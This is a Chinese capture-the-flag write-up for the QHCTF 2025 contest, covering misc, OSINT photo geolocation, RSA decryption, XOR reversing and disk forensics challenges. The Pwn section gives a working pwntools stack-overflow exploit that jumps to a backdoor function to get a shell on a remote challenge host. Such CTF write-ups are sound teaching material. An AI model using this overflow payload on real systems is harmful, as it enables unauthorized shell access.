24-Misc-Luom0-启航杯wp

| Misc | [1.QHCTF For Year 2025](#Ylsfb) |
| --- | --- |
| Misc | [2.请找出拍摄地所在位置](#uWnzg) |
| Misc | [3.PvzHE](#silFz) |
| Misc | [4.你能看懂这串未知的文字吗](#ylAON) |
| Crypto | [5.Easy_RSA](#ZEkog) |
| Re | [6.Checker](#SGZtU) |
| Re | [7.rainbow](#OngUi) |
| Pwn | [8.Pwn](#Pakcq) |
| Forensic | [9.](#CnqRW)[取证](#CnqRW) |


![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737822761899-9914a62c-cd72-41ed-9dbb-8bf1b2cc0f7b.png)



## 1.QHCTF For Year 2025
(1)下载文件，得到个pdf和hint,猜想应该是在日历中把这个数字连起来。

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737784372590-5ba41684-797d-4dd7-ac14-859cda109cdc.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737784384931-c18b3604-ce40-41a2-acab-90efd57334b4.png)

（2）进行连接得到：QHCTF{FUN}

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737784524433-c8878c2b-c06f-4be6-963d-7501e0dc1219.png)



## 2.请找出拍摄地所在位置
（1）下载文件，得到一张线索图片，里面有用的线索有：柳城、雅迪、洋丰复合肥、绿源电动车。搜索柳城，发现是广西柳州的柳城县，然后再该地区搜索雅迪，挨个查看最后得到结果。

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737784115497-2cde0cfb-372c-4640-ac32-59b1cbdd3985.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737783261280-9fc4e230-4ce9-4691-b5b9-f8286b47e78f.png)

百度地图看不到路叫什么名字，于是换高德地图查看：广西壮族自治区柳州市柳城县六广路与榕泉路交叉口

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737784001529-8b1a9c6b-98fe-454c-af19-74bc6eef0d6f.png)

## 3.PvzHE
(1)下载附件，得到了植物大战僵尸的游戏，首先010打开搜flag/ctf无果，然后再用IDA反编译，查看string，搜索一番还是没有结果，然后查看游戏的其他文件，最后在images文件夹中发现了ZombieNote1.png上有flag.

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737786953641-a54fb3c5-dbb0-4a9a-ba40-69f6d4915d45.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737786845683-6a23708f-b338-4179-9739-1197b34724f7.png)

QHCTF{300cef31-68d9-4b72-b49d-a7802da481a5}



## 4.你能看懂这串未知的文字吗
（1）下载文件，得到未知的文字，没见过...

#### ![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737792791195-0483eaa9-4f48-4cb1-8c67-b8d73f9c5c70.png)
（2）查看随波逐流的224种编码图没发现..心好累

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737792846119-8244b0d6-6375-4026-9f48-4ef5bcd9c932.png)

（3）使用百度识图，发现了一张和题目一样的编码文字，但点小红书进去发现没有，看不了。于是保存这张图，再用这张图进行百度识图，往下拉，终于发现了编码图。于是解码得到：szfpguwizgwesqzoaoerv。提交发现不对，难道是翻译错了？于是检查一遍没问题。

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737792915630-10d7b1b6-ba9f-4ea0-8591-99812641b1bf.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737793031749-0fae70e2-cfbe-4def-9625-9092e63fd2d1.png)

 szfpguwizgwesqzoaoerv

（4）猜想可能还要再解密，把图片扔进随波逐流，lsb发现隐写得到key:qihangbeiiseasy

然后进行维吉尼亚解密得到：cryptoveryeasybysheep!!!

注意最后加上三个！

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737793233947-fcf7154a-639a-4124-8e28-d03da42da3fa.png)

QHCTF{cryptoveryeasybysheep!!!}







## 5.Easy_RSA
（1）下载文件和访问网址，获得加密代码和加密的公钥私钥，根据加密代码编写解密脚本，得到flag.

```plain
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import base64

private_key = b'-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQC/rjEKfZkVchd3I41eOnDzEnDhXNOP4U8Ddz2mfOwKCdh5R8aV\n1SvgUoMf3T6099OuM4WQ0nbx0nDTUS0/YYnphJnmrbrQiywqaHNKCTizZwLlLlyT\naNyZSza7IXw9yN4L7jOp5X+Vq/4xw8RhZgPRhQUsemJJ1m4EnKedwr2R5wIDAQAB\nAoGAVL4ANHEestqEAUoYf+Y6dVxbx2awqdWkhxW6jdaAzFdZ+xR+eVOLWFtiWT4J\nMRy32zYwALzrlTHCa8phxLmsrGkMB1j9q3c/cpHTg5Mv4NEwUrO8w3Qpgyhw18sK\nd7EVIbOM/6E15kJkVyJ1v6Z3owsWVB+Q24SXqYRHmG+FCWECQQDAuvu2hmxARZKV\n845ik9O82KU4BGnIZGxHzJ6xLOQ9DLoHrCT5KPyWlTWGQNlZIpofkMSQVI1P64Hs\ng+TJskh/AkEA/pr4I6NlpSf+vqLQtWd3hR3T/emMmBEx9i3MP6jLQ1v1tG0FG11w\n/EtWaI12KlNyN3rzf6FQryAC5Etnw8DCmQJBALvE8HvR1yF/JuNlGPG9qGqyf7Vl\nx1HvVPdWyb1ASVWZUp0rABKn9f8Xe8BC6f7HkXTzbC5Z0httDXXKwlonki0CQA8o\nrumASwcAUJyNGRwT4vvcAMk3ZJWRQIZFx8lqhV+nVAPAEfPFJnr/CVAETCrM+Rnw\nihrpQeKLZ2CsVKtFCNECQA3RVfdmf96BPqBbMVhiuqPM9F3MbWxqRZT1sQFfoHzj\np83L2IlVoKPg+VEOTBiBOrl0Wf8jtbETRUKKYk7tXh0=\n-----END RSA PRIVATE KEY-----'
def decrypt_message(encrypted_message, private_key):
    key = RSA.import_key(private_key)
    cipher = PKCS1_OAEP.new(key)
    decrypted_message = cipher.decrypt(base64.b64decode(encrypted_message))
    return decrypted_message.decode()

encrypted = "jj+X89atPho1IiBXBqRWEVuwUnQlWIfE2UNZHji061fXldoETWzZ1+WoMD7tDnNV6JXbypOeAxOGyv/qS5N9/xsLLNfh/G6q+glzld1wW3K6ffAhTV4sQLel7ru71E5DxcYDOnbBMCcCPkjjBOgicTWmte99MeWZqWR8IiDCbtU="
decrypted = decrypt_message(encrypted, private_key)
print("解密后的消息:")
print(decrypted)
```

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737793940294-b9bc0544-159d-4c85-84b0-c79b7aaa122e.png)





## 6.Checker
（1）下载文件，反编译发现check_flag,点进去，发现encrypt_flag，再进入发现异或0x23加密。我们只需找到密文和0x23异或即可

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737796353931-51018ab5-9f67-4cdc-9b78-3a53673948a5.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737796372685-12e0c567-00ee-401f-9fa1-43beb9835ca7.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737796380127-22187261-f92b-44d5-b488-9b7a843a441b.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737796444752-6fa94ac4-5a75-4a6a-b96e-d062a186ba19.png)

前面一段是ASCII形式，后面是十六进制形式，脚步如下：

```plain
str1="rk`weXFF"
for i in str1:
    print(chr(ord(i)^0x23),end="")

x="15 40 14 41 1a 40 0e 46 14 45 16 0e 17 45 42 41 0e 1a 41 47 45 0e 46 42 13 14 46 13 10 17 45 15 42 16 5e"
x=x.split()
for i in x:
    print(chr(int(i,16)^0x23),end="")
```

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737796515452-41e7a5dd-084c-4305-9b19-9ad87e1f629a.png)

## 7.rainbow
下载文件，得到加密的flag,反编译文件，得到是通过xor 90得到的密文，异或回去得到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737796958868-2524fbc0-4703-4f75-8253-5bd100f49c7f.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737796945338-d7e1275c-e7c2-422e-b13f-1abcc0b49275.png)

```plain
import re
str1="0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227"
x=re.findall("(.{2})",str1)
for i in x:
    print(chr(int(i,16)^90),end="")

```

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737797008908-cee8d9e1-96db-49a8-bd22-f6d21309e873.png)



## 8.Pwn
IDA反编译发现有read()函数，可借此栈溢出

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737809124192-b371334c-c971-444e-9221-4885012478d7.png)

发现后门函数

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737809175740-295d9478-f387-4572-9e87-d57bb9c361f8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737809193367-9b35094c-d222-46b9-8849-daa4664f63d8.png)

构造pyload(注意16字节对齐 #secret地址+1可对齐)

```plain
from  pwn import *
#io=process("./pwn")
io=remote("154.64.425.108","9999")
getshell_addre=0x4011c7  
padding=0x50+8
payload=b"a"*padding+p64(getshell_addre);
io.sendline(payload)
io.interactive()

```

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737807626603-34bdc584-decf-4acf-b544-fcf147572185.png)

QHCTF{542990f2-ee3e-43fa-b8d8-eb509f37c125}



## 9.复现取证
### （1）Win_04
![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877461218-57303e5e-f50f-4775-91e8-56b0e87e7d90.png)

用Autopsy加载镜像文件，然后再Admin的Desktop中看到一个reg表，下载下来搜索qhctf拿到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877501821-a43a7a66-75c6-4bae-b552-382824b505e8.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877578131-ed9d6a97-0580-4678-82a4-f24b1f6371f3.png)

QHCTF{c980ad20-f4e4-4e72-81a0-f227f6345f01}

### （2）Win_07
![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877678386-15f94584-86f2-4f07-832a-301c716d59b4.png)

先查看最近文档

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877701901-4d391e5e-b6dd-431a-9f4e-e018df0d3b54.png)

发现flag.zip，根据路径提取出zip,发现要密码，于是去找环境命令拿password，在Admin的NTUSER.DAT用户配置文件中找到了environment，拿到了密码解压，得到base64密文，解密拿到flag

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877826261-86817a0f-c68d-44f4-b0e9-06718eb7d769.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877860008-2e6a2e0d-ad5d-4aa3-8d19-f0e3c858c09a.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877910569-df00fdca-0dfc-4366-970d-876cccc66cf5.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737877998167-a832f044-bc6c-4ba9-928d-9bf531a894af.png)

![](https://cdn.nlark.com/yuque/0/2025/png/49967934/1737878056023-52285910-dec0-448c-949f-5985f2afa6e4.png)

QHCTF{6143b46a-8e98-4356-a9b2-251a7ec19e51}



